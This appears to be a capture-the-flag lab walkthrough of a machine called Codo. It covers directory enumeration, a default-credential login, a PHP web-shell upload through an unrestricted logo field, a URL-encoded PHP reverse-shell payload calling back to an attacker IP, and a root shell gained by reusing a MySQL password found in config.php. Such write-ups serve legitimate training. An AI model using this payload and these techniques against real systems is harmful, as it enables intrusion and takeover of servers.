Codo

Target IP: 192.168.170.23

Scanning


There are two TCP ports open on the target machine: SSH and HTTP.

Enumeration

Port 80: HTTP

The webpage above is displayed for this application.


I performed a directory search using the command gobuster dir -u http://192.168.170.23/ -w /usr/share/wordlists/dirb/big.txt -x php,html,txt and obtained the result above.


I gained access to the login page using the default credentials admin:admin.

Exploitation


It looks like there is no file restriction in place for the logo of the application. I created a simple PHP web-shell with the name shell.php and uploaded it.


To access it, I browsed to http://192.168.170.23/sites/default/assets/img/attachments/shell.php. And now I have a simple web-shell to preform RCE. Time to upgrade it to a reverse shell connection.


And now I have a reverse shell connection on port 8443. I used the PHP payload below.

PHP payload used: php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.173%22%2C8443%29%3Bshell_exec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27.
Full URL with payload: http://192.168.170.23/sites/default/assets/img/attachments/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.173%22%2C8443%29%3Bshell_exec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27.

Privilege Escalation


I found an interesting file called config.php at /var/www/html/sites/default with the username and password for the MySQL application.


Using the credentials codo:FatPanda123, I gained access to the MySQL application. There is an interesting table called codo_users with two entries, as shown above.


I saved the hash of user admin in a file called hash and used john to crack this password hash. I obtained the password admin. After spraying this password against the two users root and offsec did not work!


However, spraying FatPanda123 against root worked. Now I have a root shell!

Flag


The proof.txt flag once I gained a root shell using the password from enumeration. There is only one flag for this challenge.
